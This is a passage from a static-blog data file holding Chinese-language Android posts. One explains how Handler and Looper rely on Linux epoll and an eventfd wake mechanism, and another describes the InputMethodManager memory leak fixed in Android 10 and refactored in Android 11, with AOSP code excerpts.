<span class=\"built_in\">TEMP_FAILURE_RETRY</span>(<span class=\"built_in\">read</span>(mWakeEventFd.<span class=\"built_in\">get</span>(), &amp;counter, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见，<code>awoken</code> （被唤醒的意思）函数实际上就是一个管道的读操作，既然此时被epoll事件驱动唤醒起来读，那么肯定就是监听到对应的写操作导致的，显然，写操作就在 <code>wake</code> 函数中：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Looper::wake</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> inc = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 往wake pipe里面写了一个1，触发了唤醒</span></span><br><span class=\"line\">    <span class=\"type\">ssize_t</span> nWrite = <span class=\"built_in\">TEMP_FAILURE_RETRY</span>(<span class=\"built_in\">write</span>(mWakeEventFd.<span class=\"built_in\">get</span>(), &amp;inc, <span class=\"built_in\">sizeof</span>(<span class=\"type\">uint64_t</span>)));</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里需要额外提醒一下，旧版本的源码是这样创建唤醒事件描述符的：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> wakeFds[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> result = <span class=\"built_in\">pipe</span>(wakeFds);</span><br><span class=\"line\">mWakeReadPipeFd = wakeFds[<span class=\"number\">0</span>];</span><br><span class=\"line\">mWakeWritePipeFd = wakeFds[<span class=\"number\">1</span>];</span><br></pre></td></tr></table></figure>\n\n<p>读和写是两个描述符，而最新的系统源码中只用了一个mWakeEventFd描述符，可能是考虑到Handler消息机制并不需要跨进程的缘故，具体还有待研究。</p>\n<p>上述的 <code>Looper::wake()</code> 函数源头其实就是是由MQ的 <code>nativeWake</code> 函数调用的：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">android_os_MessageQueue_nativeWake</span><span class=\"params\">(JNIEnv* env, jclass clazz, jlong ptr)</span> </span>&#123;</span><br><span class=\"line\">    NativeMessageQueue* nativeMessageQueue = <span class=\"built_in\">reinterpret_cast</span>&lt;NativeMessageQueue*&gt;(ptr);</span><br><span class=\"line\">    nativeMessageQueue-&gt;<span class=\"built_in\">wake</span>(); <span class=\"comment\">// MQ内部会进一步调用Looper::wake()</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>回想一下上文，<code>nativeWake(mPtr);</code> 在Java层就是由 <code>enqueueMessage</code> 方法调用的，即消息入队时。至此，我们终于贯通了整个流程，从Java层一直探索到了Linux内核的系统调用，喜大普奔啊！</p>\n<p>总结一下，回到标题，为什么说<strong>没有epoll就没有Handler</strong>。因为Handler + Looper + MessageQueue这一套消息机制之所以可以处理延时消息，且达到事件驱动的效果，还不占用CPU资源，究其本质就是Native层使用了Linux内核的epoll I&#x2F;O事件通知机制。满足了两个场景：</p>\n<ul>\n<li><p>当通过 <code>postDelayed</code> 发送延时消息后，传入的时间最终会通过 <code>nativePollOnce</code> 方法进行带超时的阻塞，本质上是因为 <code>epoll_wait</code> 函数的挂起，达到了延时的目的。</p>\n<p>时间到后阻塞结束，<code>epoll_wait</code> 返回，线程被重新唤醒并获得CPU资源，且epoll事件数（event_count）为0，说明中途没被唤醒，然后 <code>nativePollOnce</code> 直接返回，进而MQ的 <code>next</code> 方法再返回消息对象给上层Looper。</p>\n</li>\n<li><p>在MessageQueue的 <code>enqueueMessage</code> 方法中会判断新插入的消息的时间是否小于队头消息的时间，以决定要不要立即唤醒，即通过 <code>nativeWake</code> 方法打断超时未到的阻塞。</p>\n<p>若需唤醒，便会往wake pipe唤醒管道中写入数据（其实就是一个整数1），由于epoll监听了mWakeEventFd唤醒事件描述符，所以此时 <code>epoll_wait</code> 结束了挂起状态，返回事件数大于0，进而调用到 <code>awoken</code>，最后 <code>nativePollOnce</code> 返回result为POLL_WAKE，上层消息得以继续处理。因为我们知道Looper的loop是一直在循环调用next的，如果底层不醒，上层就会阻塞。</p>\n</li>\n</ul>\n<p>所以要么是timeout到了自动唤醒，要么是由于新消息插入导致主动唤醒。用不太严谨的流程图来描述一下主动唤醒的过程：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201119000301533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\"></p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>在应用进程退到后台时，一般情况下就没有什么消息发送了，所以主线程便阻塞在queue.next()中的 <code>nativePollOnce</code> 方法里，并释放CPU资源进入休眠状态，并不会消耗大量CPU资源。即便在前台，只要你的UI没有动画绘制或者没有触摸交互，也是差不多的状态。这也回答了为什么Looper中在进行无限循环却不会导致异常耗电的问题。</p>\n<p>关于Linux系统调用为什么可以挂起且不占用CPU时间片，CPU的定时器和中断又是怎么实现的？那可能就涉及到硬件知识了，好好复习组成原理吧哈哈哈。后续有空我也会补充上来。</p>\n<p>其实研究到最后，我才悟出了为什么epoll要叫epoll，因为它和原来poll机制的最大区别就是改善成了event（事件）驱动，这个e如果我没猜错的话应该代表的就是event。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><a href=\"https://my.oschina.net/u/3863980/blog/1933086\">Android中的Handler的Native层研究</a></li>\n<li><a href=\"http://c.biancheng.net/view/3066.html\">Linux 文件描述符到底是什么？</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/143430585\">理解Linux的文件描述符FD与Inode</a></li>\n<li><a href=\"https://juejin.im/post/6844904005202608136\">文件描述符fd（File Descriptor）简介</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/58489873\">Linux 的进程间通信：管道</a></li>\n<li><a href=\"https://www.jianshu.com/p/9c0c2b57cb73\">Linux管道命令（pipe）</a></li>\n<li><a href=\"https://www.cnblogs.com/lojunren/p/3856290.html\">Linux下的I&#x2F;O复用与epoll详解</a></li>\n<li><a href=\"https://blog.csdn.net/sunyurun/article/details/8194979\">异步阻塞IO —— epoll</a></li>\n<li><a href=\"https://www.jianshu.com/p/1cda21639f3e\">Handler 中的 epoll</a></li>\n</ul>\n"},{"layout":"post","title":"InputMethodManager内存泄漏已成为历史","subtitle":"大人，时代变了。","date":"2020-11-26T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 历史问题\n\n相信做过很多业务开发的同学都遇到过Android应用的内存泄漏问题，虽然大部分泄漏都是我们自己**菜**导致的，但实际上系统服务也有可能出现内存泄漏。毕竟，代码都是人写的，AOSP也不是完美无瑕的。\n\n说到系统服务，在处理文本输入的时候，我们以前经常会看到这样的泄漏：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125205854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n这里大家也可自行搜索了解，大致上就是因为**InputMethodManager（下简称IMM）实例内部会持有View**，而View又持有Activity的引用，最终在Activity退出后没有正确处理View导致了Memory Leak。我们明白，系统服务生命周期一般是长于Activity的。\n\n这里可以查看旧版AOSP源码（分支：android-9.0.0-r8）来取证：\n\n```java\npublic final class InputMethodManager {\n    ...\n    /**\n     * This is the root view of the overall window that currently has input\n     * method focus.\n     */\n    View mCurRootView;\n    /**\n     * This is the view that should currently be served by an input method,\n     * regardless of the state of setting that up.\n     */\n    View mServedView;\n    /**\n     * This is then next view that will be served by the input method, when\n     * we get around to updating things.\n     */\n    View mNextServedView;\n    ...\n    /**\n     * When the focused window is dismissed, this method is called to finish the\n     * input method started before.\n     * @hide\n     */\n    public void windowDismissed(IBinder appWindowToken) {\n        ...\n        synchronized (mH) {\n            if (mServedView != null &&\n                    mServedView.getWindowToken() == appWindowToken) {\n                finishInputLocked();\n            }\n        }\n    }\n    ...\n    /**\n     * Disconnect any existing input connection, clearing the served view.\n     */\n    void finishInputLocked() {\n        mNextServedView = null;\n        if (mServedView != null) {\n            ...\n            mServedView = null;\n            ...\n        }\n    }\n    ...\n    /**\n     * Call this when a view is being detached from a {@link android.view.Window}.\n     * @hide\n     */\n    public void onViewDetachedFromWindow(View view) {\n        synchronized (mH) {\n            ...\n            if (mServedView == view) {\n                mNextServedView = null;\n                ...\n            }\n        }\n    }\n    ...\n}\n```\n\n我们可以搜索源码发现虽然mServedView和mNextServedView都有在合适的时机做置空操作，**但最关键的输入焦点View即mCurRootView没有置空的地方**，这也是导致泄漏的主要原因。尤其是在列表视图（ListView，RecyclerView等）中如果itemView中带有输入框，尤其容易产生泄漏的问题。\n\n曾经的解决办法通常都是反射操作IMM实例然后把这几个View对象强制置空，此处不再赘述。\n\n## 大人，时代变了\n\n我查阅了近几年的AOSP大版本源码，意外地发现，在Android 10的IMM中，这个内存泄漏的问题竟然修复了！有点惊奇的是，这个修复还是MIUI的工程师贡献的patch。\n\n这个修复在2018年下半年就提交了，最终在Android 10才合入，下面的代码基于分支android-10.0.0_r30：\n\n![](https://imgconvert.csdnimg.cn/20201127125312174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n也就是说，在Android 9及以前，IMM的内存泄漏问题都没有得到官方的及时修复，最后还是国内厂商的工程师实在忍不住给修了（之前我还在MIUI的时候也给系统组提过这个bug）。\n\n出于好奇，我查看了一下[这个patch的提交信息](https://cs.android.com/android/_/android/platform/frameworks/base/+/dff365ef4dc61239fac70953b631e92972a9f41f)：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125344306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n看看描述，没差了，就是为了修复数年未解的IMM内存泄漏问题。不知道全球开发者为了这个玩意头疼了多久（毕竟Memory Leak也是一个项目质量指标的对吧，说白了影响你绩效 /狗头）。\n\n这个问题也有对应的官方bug issue，大家有兴趣可以看看：[InputMethodManager#sInstance#mCurRootView cause memory leak](https://issuetracker.google.com/issues?q=116078227) ，最后也是得到了AOSP官方团队验证的：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125406506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n## 进一步优化\n\n虽然MIUI的大佬已经对此进行了修复，但IMM依然存在一些代码结构上的问题，可能导致了一些其他bug，官方团队在Android 11中对IMM源码做了[进一步优化](https://cs.android.com/android/_/android/platform/frameworks/base/+/970d9d2e0c979cf9a0ff0a79ef49044ed1363d4f) ，这次的改动还不小：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125443171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n这里我简单做一下介绍，大家感兴趣可以查看最新的源码。我们可以发现，在最新的IMM中，后面2个View已经从中去除了：\n\n```java\npublic final class InputMethodManager {\n    /**\n     * This is the root view of the overall window that currently has input\n     * method focus.\n     */\n    @GuardedBy(\"mH\")\n    ViewRootImpl mCurRootView;\n    ...\n}\n```\n\n只留下了mCurRootView的ViewRootImpl对象。原本IMM内很多跟mCurRootView相关的操作封装到了一个新建的**ImeFocusController**类中：\n\n```java\npublic final class ImeFocusController {\n\t...\n    private final ViewRootImpl mViewRootImpl;\n    private boolean mHasImeFocus = false;\n    private View mServedView;\n    private View mNextServedView;\n\n    @UiThread\n    ImeFocusController(@NonNull ViewRootImpl viewRootImpl) {\n        mViewRootImpl = viewRootImpl;\n    }\n\n    private InputMethodManagerDelegate getImmDelegate() {\n        return mViewRootImpl.mContext.getSystemService(InputMethodManager.class).getDelegate();\n    }\n    \n    @UiThread\n    void onViewDetachedFromWindow(View view) {\n        ...\n        if (mServedView == view) {\n            mNextServedView = null;\n            mViewRootImpl.dispatchCheckFocus();\n        }\n    }\n\n    @UiThread\n    void onWindowDismissed() {\n        ...\n        if (mServedView != null) {\n            getImmDelegate().finishInput();\n        }\n        getImmDelegate().setCurrentRootView(null);\n        mHasImeFocus = false;\n    }\n    ...\n    public View getServedView() {\n        return mServedView;\n    }\n\n    public View getNextServedView() {\n        return mNextServedView;\n    }\n\n    public void setServedView(View view) {\n        mServedView = view;\n    }\n\n    public void setNextServedView(View view) {\n        mNextServedView = view;\n    }\n}\n```\n\n我们可以看到，曾经的置空操作基本都放到了这个Controller中。mServedView和mNextServedView不再是IMM的成员，而是ImeFocusController的成员，且ImeFocusController又是ViewRootImpl的成员（此Controller实例化在ViewRootImpl的构造方法中）。\n\n这个patch的优化，一定程度上解除了View对IMM的依赖，代码有效解耦。输入焦点处理的相关逻辑都转移到了View本身来控制，进一步避免了内存泄漏。\n\n## 后话\n\n其实每次我在搜到一些问题的解决资料时，都会关注一下帖子的发布时间，我发现IMM内存泄漏这个问题基本都是2019年之前的，好奇就去看了下最新的源码发现果然有所修复。Android系统还是在朝着越来越稳定，性能越来越优秀的方向发展。\n\n在AOSP的Code Review平台上也可以发现，其实国内外各大手机厂商都对AOSP有着巨大的贡献，大家也不是一味埋头搞自己的定制，有bug还是会反哺修复的。再次感谢开源！\n\n感兴趣可以浏览，会看到很多change的owner都不是Google的：\n\n- [https://android-review.googlesource.com/q/xiaomi](https://android-review.googlesource.com/q/xiaomi)\n- [https://android-review.googlesource.com/q/huawei](https://android-review.googlesource.com/q/huawei)\n- [https://android-review.googlesource.com/q/oppo](https://android-review.googlesource.com/q/oppo)\n- [https://android-review.googlesource.com/q/samsung](https://android-review.googlesource.com/q/samsung)\n- [https://android-review.googlesource.com/q/sony](https://android-review.googlesource.com/q/sony)\n","source":"_posts/2020-11-27-InputMethodManager内存泄漏已成为历史.md","raw":"---\nlayout:     post\ntitle:      InputMethodManager内存泄漏已成为历史\nsubtitle:   大人，时代变了。\ndate:       2020-11-27\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AOSP\n---\n\n## 历史问题\n\n相信做过很多业务开发的同学都遇到过Android应用的内存泄漏问题，虽然大部分泄漏都是我们自己**菜**导致的，但实际上系统服务也有可能出现内存泄漏。毕竟，代码都是人写的，AOSP也不是完美无瑕的。\n\n说到系统服务，在处理文本输入的时候，我们以前经常会看到这样的泄漏：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125205854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n这里大家也可自行搜索了解，大致上就是因为**InputMethodManager（下简称IMM）实例内部会持有View**，而View又持有Activity的引用，最终在Activity退出后没有正确处理View导致了Memory Leak。我们明白，系统服务生命周期一般是长于Activity的。\n\n这里可以查看旧版AOSP源码（分支：android-9.0.0-r8）来取证：\n\n```java\npublic final class InputMethodManager {\n    ...\n    /**\n     * This is the root view of the overall window that currently has input\n     * method focus.\n     */\n    View mCurRootView;\n    /**\n     * This is the view that should currently be served by an input method,\n     * regardless of the state of setting that up.\n     */\n    View mServedView;\n    /**\n     * This is then next view that will be served by the input method, when\n     * we get around to updating things.\n     */\n    View mNextServedView;\n    ...\n    /**\n     * When the focused window is dismissed, this method is called to finish the\n     * input method started before.\n     * @hide\n     */\n    public void windowDismissed(IBinder appWindowToken) {\n        ...\n        synchronized (mH) {\n            if (mServedView != null &&\n                    mServedView.getWindowToken() == appWindowToken) {\n                finishInputLocked();\n            }\n        }\n    }\n    ...\n    /**\n     * Disconnect any existing input connection, clearing the served view.\n     */\n    void finishInputLocked() {\n        mNextServedView = null;\n        if (mServedView != null) {\n            ...\n            mServedView = null;\n            ...\n        }\n    }\n    ...\n    /**\n     * Call this when a view is being detached from a {@link android.view.Window}.\n     * @hide\n     */\n    public void onViewDetachedFromWindow(View view) {\n        synchronized (mH) {\n            ...\n            if (mServedView == view) {\n                mNextServedView = null;\n                ...\n            }\n        }\n    }\n    ...\n}\n```\n\n我们可以搜索源码发现虽然mServedView和mNextServedView都有在合适的时机做置空操作，**但最关键的输入焦点View即mCurRootView没有置空的地方**，这也是导致泄漏的主要原因。尤其是在列表视图（ListView，RecyclerView等）中如果itemView中带有输入框，尤其容易产生泄漏的问题。\n\n曾经的解决办法通常都是反射操作IMM实例然后把这几个View对象强制置空，此处不再赘述。\n\n## 大人，时代变了\n\n我查阅了近几年的AOSP大版本源码，意外地发现，在Android 10的IMM中，这个内存泄漏的问题竟然修复了！有点惊奇的是，这个修复还是MIUI的工程师贡献的patch。\n\n这个修复在2018年下半年就提交了，最终在Android 10才合入，下面的代码基于分支android-10.0.0_r30：\n\n![](https://imgconvert.csdnimg.cn/20201127125312174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n也就是说，在Android 9及以前，IMM的内存泄漏问题都没有得到官方的及时修复，最后还是国内厂商的工程师实在忍不住给修了（之前我还在MIUI的时候也给系统组提过这个bug）。\n\n出于好奇，我查看了一下[这个patch的提交信息](https://cs.android.com/android/_/android/platform/frameworks/base/+/dff365ef4dc61239fac70953b631e92972a9f41f)：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125344306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n看看描述，没差了，就是为了修复数年未解的IMM内存泄漏问题。不知道全球开发者为了这个玩意头疼了多久（毕竟Memory Leak也是一个项目质量指标的对吧，说白了影响你绩效 /狗头）。\n\n这个问题也有对应的官方bug issue，大家有兴趣可以看看：[InputMethodManager#sInstance#mCurRootView cause memory leak](https://issuetracker.google.com/issues?q=116078227) ，最后也是得到了AOSP官方团队验证的：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125406506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n## 进一步优化\n\n虽然MIUI的大佬已经对此进行了修复，但IMM依然存在一些代码结构上的问题，可能导致了一些其他bug，官方团队在Android 11中对IMM源码做了[进一步优化](https://cs.android.com/android/_/android/platform/frameworks/base/+/970d9d2e0c979cf9a0ff0a79ef49044ed1363d4f) ，这次的改动还不小：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20201127125443171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n这里我简单做一下介绍，大家感兴趣可以查看最新的源码。我们可以发现，在最新的IMM中，后面2个View已经从中去除了：\n\n```java\npublic final class InputMethodManager {\n    /**\n     * This is the root view of the overall window that currently has input\n     * method focus.\n     */\n    @GuardedBy(\"mH\")\n    ViewRootImpl mCurRootView;\n    ...\n}\n```\n\n只留下了mCurRootView的ViewRootImpl对象。原本IMM内很多跟mCurRootView相关的操作封装到了一个新建的**ImeFocusController**类中：\n\n```java\npublic final class ImeFocusController {\n\t...\n    private final ViewRootImpl mViewRootImpl;\n    private boolean mHasImeFocus = false;\n    private View mServedView;\n    private View mNextServedView;\n\n    @UiThread\n    ImeFocusController(@NonNull ViewRootImpl viewRootImpl) {\n        mViewRootImpl = viewRootImpl;\n    }\n\n    private InputMethodManagerDelegate getImmDelegate() {\n        return mViewRootImpl.mContext.getSystemService(InputMethodManager.class).getDelegate();\n    }\n    \n    @UiThread\n    void onViewDetachedFromWindow(View view) {\n        ...\n        if (mServedView == view) {\n            mNextServedView = null;\n            mViewRootImpl.dispatchCheckFocus();\n        }\n    }\n\n    @UiThread\n    void onWindowDismissed() {\n        ...\n        if (mServedView != null) {\n            getImmDelegate().finishInput();\n        }\n        getImmDelegate().setCurrentRootView(null);\n        mHasImeFocus = false;\n    }\n    ...\n    public View getServedView() {\n        return mServedView;\n    }\n\n    public View getNextServedView() {\n        return mNextServedView;\n    }\n\n    public void setServedView(View view) {\n        mServedView = view;\n    }\n\n    public void setNextServedView(View view) {\n        mNextServedView = view;\n    }\n}\n```\n\n我们可以看到，曾经的置空操作基本都放到了这个Controller中。mServedView和mNextServedView不再是IMM的成员，而是ImeFocusController的成员，且ImeFocusController又是ViewRootImpl的成员（此Controller实例化在ViewRootImpl的构造方法中）。\n\n这个patch的优化，一定程度上解除了View对IMM的依赖，代码有效解耦。输入焦点处理的相关逻辑都转移到了View本身来控制，进一步避免了内存泄漏。\n\n## 后话\n\n其实每次我在搜到一些问题的解决资料时，都会关注一下帖子的发布时间，我发现IMM内存泄漏这个问题基本都是2019年之前的，好奇就去看了下最新的源码发现果然有所修复。Android系统还是在朝着越来越稳定，性能越来越优秀的方向发展。\n\n在AOSP的Code Review平台上也可以发现，其实国内外各大手机厂商都对AOSP有着巨大的贡献，大家也不是一味埋头搞自己的定制，有bug还是会反哺修复的。再次感谢开源！\n\n感兴趣可以浏览，会看到很多change的owner都不是Google的：\n\n- [https://android-review.googlesource.com/q/xiaomi](https://android-review.googlesource.com/q/xiaomi)\n- [https://android-review.googlesource.com/q/huawei](https://android-review.googlesource.com/q/huawei)\n- [https://android-review.googlesource.com/q/oppo](https://android-review.googlesource.com/q/oppo)\n- [https://android-review.googlesource.com/q/samsung](https://android-review.googlesource.com/q/samsung)\n- [https://android-review.googlesource.com/q/sony](https://android-review.googlesource.com/q/sony)\n","slug":"InputMethodManager内存泄漏已成为历史","published":1,"updated":"2024-03-25T07:31:25.864Z","comments":1,"photos":[],"link":"","_id":"cluaufh17003dthe68ayf7pl9","content":"<h2 id=\"历史问题\"><a href=\"#历史问题\" class=\"headerlink\" title=\"历史问题\"></a>历史问题</h2><p>相信做过很多业务开发的同学都遇到过Android应用的内存泄漏问题，虽然大部分泄漏都是我们自己<strong>菜</strong>导致的，但实际上系统服务也有可能出现内存泄漏。毕竟，代码都是人写的，AOSP也不是完美无瑕的。</p>\n<p>说到系统服务，在处理文本输入的时候，我们以前经常会看到这样的泄漏：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20201127125205854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>这里大家也可自行搜索了解，大致上就是因为<strong>InputMethodManager（下简称IMM）实例内部会持有View</strong>，而View又持有Activity的引用，最终在Activity退出后没有正确处理View导致了Memory Leak。我们明白，系统服务生命周期一般是长于Activity的。</p>\n<p>这里可以查看旧版AOSP源码（分支：android-9.0.0-r8）来取证：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">class</span> <span class=\"title class_\">InputMethodManager</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is the root view of the overall window that currently has input</span></span><br><span class=\"line\"><span class=\"comment\">     * method focus.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    View mCurRootView;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is the view that should currently be served by an input method,</span></span><br><span class=\"line\"><span class=\"comment\">     * regardless of the state of setting that up.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    View mServedView;</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * This is then next view that will be served by the input method, when</span></span><br><span class=\"line\"><span class=\"comment\">     * we get around to updating things.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    View mNextServedView;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * When the focused window is dismissed, this method is called to finish the</span></span><br><span class=\"line\"><span class=\"comment\">     * input method started before.</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@hide</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">windowDismissed</span><span class=\"params\">(IBinder appWindowToken)</span> &#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span> (mH) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mServedView != <span class=\"literal\">null</span> &amp;&amp;</span><br><span class=\"line\">                    mServedView.getWindowToken() == appWindowToken) &#123;</span><br><span class=\"line\">                finishInputLocked();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Disconnect any existing input connection, clearing the served view.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">finishInputLocked</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        mNextServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (mServedView != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">            mServedView = <span class=\"literal\">null</span>;</span><br><span class=\"line\">            ...</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Call this when a view is being detached from a &#123;<span class=\"doctag\">@link</span> android.view.Window&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@hide</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title 